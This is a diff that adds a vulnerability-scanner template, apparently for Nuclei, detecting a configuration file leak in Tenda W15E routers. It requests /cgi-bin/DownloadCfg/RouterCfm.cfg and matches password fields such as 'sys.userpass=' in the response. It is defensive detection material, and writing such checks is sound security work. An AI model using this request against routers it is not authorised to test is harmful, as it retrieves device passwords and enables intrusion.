@@ -1,0 +1,28 @@
+id: tenda-w15e-router-config-leak
+info:
+  name: Tenda W15E Router Configuration File Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-leak, router, tenda
+  description: |
+    Tenda W15E enterprise-level routers are vulnerable to a configuration file leak through the /cgi-bin/DownloadCfg/RouterCfm.cfg endpoint.
+    The leaked file contains sensitive information such as system passwords.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/DownloadCfg/RouterCfm.cfg"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "sys.userpass="
+          - "sys.userpass.decode.pwd="
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
